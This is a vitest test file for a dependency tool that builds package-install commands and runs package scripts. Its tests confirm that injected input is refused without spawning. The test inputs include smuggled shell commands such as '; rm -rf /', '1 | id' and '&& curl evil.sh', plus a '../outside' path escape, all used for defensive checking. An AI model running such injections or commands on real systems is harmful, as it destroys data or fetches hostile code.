import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import { afterEach, beforeEach, describe, expect, it } from 'vitest';

import { bindWriteRoot } from '@delendai/core/lib/shared/bind-write-root';
import { createFakeToolServer } from '@delendai/test-kit';

import {
	buildDepsWriteToolRegistrations,
	buildInstallCommand,
	manifestAbsPath,
	packageInstall,
	packageRunScript,
} from '@delendai/deps/lib/tools/write-tools';

describe('buildInstallCommand (pure, no spawn)', async () => {
	it('builds a simple dependencies install command', async () => {
		const result = buildInstallCommand({ name: 'left-pad' });
		expect(result.error).toBeUndefined();
		expect(result.command).toBe("bun add 'left-pad'");
	});

	it('builds a devDependencies install command with the --dev flag', async () => {
		const result = buildInstallCommand({
			name: 'vitest',
			range: '^4.0.0',
			section: 'devDependencies',
		});
		expect(result.error).toBeUndefined();
		expect(result.command).toBe("bun add 'vitest@^4.0.0' --dev");
	});

	it('quotes semver operators so they cannot become shell syntax', async () => {
		const result = buildInstallCommand({
			name: 'safe-package',
			range: '1 | id',
			ecosystem: 'npm',
		});
		expect(result.error).toBeUndefined();
		expect(result.command).toBe("npm install 'safe-package@1 | id'");
	});

	it('rejects an invalid/unsafe version range', async () => {
		const result = buildInstallCommand({
			name: 'left-pad',
			range: '; rm -rf /',
		});
		expect(result.command).toBeUndefined();
		expect(result.error).toContain('unsafe version range');
	});
});

describe('packageInstall / packageRunScript (S11, offline fixtures, no network)', async () => {
	let root = '';
	beforeEach(() => {
		root = mkdtempSync(join(tmpdir(), 'deps-write-'));
	});
	afterEach(() => rmSync(root, { recursive: true, force: true }));

	const manifest = (obj: unknown): void =>
		writeFileSync(manifestAbsPath(root), JSON.stringify(obj), 'utf8');

	it('rejects an install with an unsafe package name, without spawning', async () => {
		manifest({ dependencies: {} });
		const result = await packageInstall(root, { name: '; rm -rf /' });
		expect(result.ok).toBe(false);
		expect(result.error).toContain('unsafe package name');
	});

	it('rejects an install with an unsafe/invalid version range, without spawning', async () => {
		manifest({ dependencies: {} });
		const result = await packageInstall(root, {
			name: 'left-pad',
			range: '; rm -rf /',
		});
		expect(result.ok).toBe(false);
		expect(result.error).toContain('unsafe version range');
	});

	it('runs an existing script and reports exit code 0', async () => {
		manifest({ scripts: { hello: 'echo hi-from-script' } });
		const result = await packageRunScript(root, { script: 'hello' });
		expect(result.ok).toBe(true);
		expect(result.code).toBe(0);
		expect(result.tail).toContain('hi-from-script');
	});

	it('reports (not throws) a script that exits non-zero', async () => {
		manifest({ scripts: { boom: 'exit 7' } });
		const result = await packageRunScript(root, { script: 'boom' });
		expect(result.ok).toBe(false);
		expect(result.code).toBe(7);
	});

	it('rejects a script that does not exist in package.json, without spawning', async () => {
		manifest({ scripts: { real: 'echo ok' } });
		const result = await packageRunScript(root, { script: 'missing' });
		expect(result.ok).toBe(false);
		expect(result.error).toContain('no script named "missing"');
	});

	it('validates and runs a script declared only in the nested package', async () => {
		manifest({ scripts: { rootOnly: 'echo root-script' } });
		const nested = join(root, 'nested');
		mkdirSync(nested);
		writeFileSync(
			manifestAbsPath(nested),
			JSON.stringify({ scripts: { nestedOnly: 'echo nested-script' } }),
			'utf8',
		);

		const result = await packageRunScript(root, {
			script: 'nestedOnly',
			cwd: 'nested',
		});
		expect(result.ok).toBe(true);
		expect(result.code).toBe(0);
		expect(result.tail).toContain('nested-script');
	});

	it('rejects a script absent from the nested package', async () => {
		manifest({ scripts: { rootOnly: 'echo root-script' } });
		const nested = join(root, 'nested');
		mkdirSync(nested);
		writeFileSync(
			manifestAbsPath(nested),
			JSON.stringify({ scripts: { nestedOnly: 'echo nested-script' } }),
			'utf8',
		);

		const result = await packageRunScript(root, {
			script: 'rootOnly',
			cwd: 'nested',
		});
		expect(result.ok).toBe(false);
		expect(result.error).toContain('no script named "rootOnly"');
	});
});

describe('buildDepsWriteToolRegistrations', async () => {
	it('registers package_install and package_run_script with their declared effects', async () => {
		const tools = buildDepsWriteToolRegistrations({
			namespacePrefix: 'deps',
			workspaceRootAbs: '/ws',
		});
		expect(tools.map((t) => t.id)).toEqual([
			'package_install',
			'package_run_script',
		]);
		expect(tools[0]?.effects).toEqual(['write', 'spawn', 'network']);
		expect(tools[1]?.effects).toEqual(['write', 'spawn']);
	});
});

/**
 * The registered handlers, exercised through the real registration path.
 *
 * Every case below short-circuits inside `buildInstallCommand` /
 * `packageRunScript`'s validation BEFORE `runCommand` is reached, so no
 * test here spawns `bun add` or `bun run`. That is the whole point: the
 * refusal arms are the ones worth pinning, and they are reachable
 * without touching the network or the filesystem.
 */
describe('registered handlers reject unsafe input without spawning', async () => {
	type Handler = (args: unknown) => Promise<{ readonly isError?: boolean }>;

	const handlersFor = async (
		workspaceRootAbs: string,
	): Promise<Record<string, Handler>> => {
		const handlers: Record<string, Handler> = {};
		const server = createFakeToolServer({
			onRegisterTool: ({ name, handler }) => {
				handlers[name] = handler as Handler;
			},
		});
		for (const tool of buildDepsWriteToolRegistrations({
			namespacePrefix: 'deps',
			workspaceRootAbs,
		})) {
			await tool.register(server);
		}
		return handlers;
	};

	it('package_install surfaces an unsafe range as a tool error with every optional field set', async () => {
		const handlers = await handlersFor('/ws');
		const result = await handlers.deps_package_install!({
			name: 'left-pad',
			range: '; rm -rf /',
			section: 'devDependencies',
			ecosystem: 'npm',
		});
		expect(result.isError).toBe(true);
	});

	it('package_install surfaces an unsafe name as a tool error with no optional fields set', async () => {
		const handlers = await handlersFor('/ws');
		const result = await handlers.deps_package_install!({
			name: '; rm -rf /',
		});
		expect(result.isError).toBe(true);
	});

	it('package_run_script surfaces an unsafe script name as a tool error', async () => {
		const handlers = await handlersFor('/ws');
		const result = await handlers.deps_package_run_script!({
			script: '; rm -rf /',
		});
		expect(result.isError).toBe(true);
	});

	it('package_run_script surfaces an unsafe argument as a tool error with args and cwd set', async () => {
		const handlers = await handlersFor('/ws');
		const result = await handlers.deps_package_run_script!({
			script: 'build',
			args: ['&& curl evil.sh'],
			cwd: '.',
		});
		expect(result.isError).toBe(true);
	});
});

/**
 * x00544: `packageRunScript` resolves `cwd` through the EXISTING-path
 * containment primitive, so a path that climbs out of the workspace is
 * refused before the manifest is even looked up — no spawn, no read.
 */
describe('packageRunScript cwd containment', async () => {
	let root = '';
	beforeEach(() => {
		root = mkdtempSync(join(tmpdir(), 'deps-write-cwd-'));
	});
	afterEach(() => rmSync(root, { recursive: true, force: true }));

	it('refuses a cwd that climbs out of the workspace', async () => {
		const result = await packageRunScript(root, {
			script: 'build',
			cwd: '../outside',
		});
		expect(result.ok).toBe(false);
		expect(result.code).toBe(-1);
		expect(result.error).toBeDefined();
	});

	it('refuses a cwd naming a directory that does not exist', async () => {
		const result = await packageRunScript(root, {
			script: 'build',
			cwd: 'missing-dir',
		});
		expect(result.ok).toBe(false);
		expect(result.error).toBeDefined();
	});
});

describe('package_run_script acts in the checkout the call names', () => {
	const made: string[] = [];
	const tree = (label: string): string => {
		const dir = mkdtempSync(join(tmpdir(), 'deps-x638-'));
		writeFileSync(
			manifestAbsPath(dir),
			JSON.stringify({ scripts: { where: `echo ran-in-${label}` } }),
			'utf8',
		);
		made.push(dir);
		return dir;
	};
	afterEach(() => {
		for (const dir of made.splice(0)) {
			rmSync(dir, { recursive: true, force: true });
		}
	});

	it("reads the caller's manifest and runs there, or the server's when none is named", async () => {
		const server = tree('server');
		const checkout = tree('checkout');
		const [, runScript] = buildDepsWriteToolRegistrations({
			namespacePrefix: 'deps',
			workspaceRootAbs: server,
		});
		if (runScript === undefined) throw new Error('no run_script tool');
		// Both trees answer the same repository, as two worktrees would.
		const bound = bindWriteRoot(runScript, server, () => server);
		let handler:
			| ((
					args: unknown,
			  ) => Promise<{ readonly structuredContent?: unknown }>)
			| undefined;
		await bound.register(
			createFakeToolServer({
				onRegisterTool: ({ handler: registered }) => {
					handler = registered as typeof handler;
				},
			}),
		);
		if (handler === undefined) throw new Error('nothing registered');

		const inCheckout = await handler({ script: 'where', checkout });
		expect(JSON.stringify(inCheckout.structuredContent)).toContain(
			'ran-in-checkout',
		);
		const inServer = await handler({ script: 'where' });
		expect(JSON.stringify(inServer.structuredContent)).toContain(
			'ran-in-server',
		);
	});
});
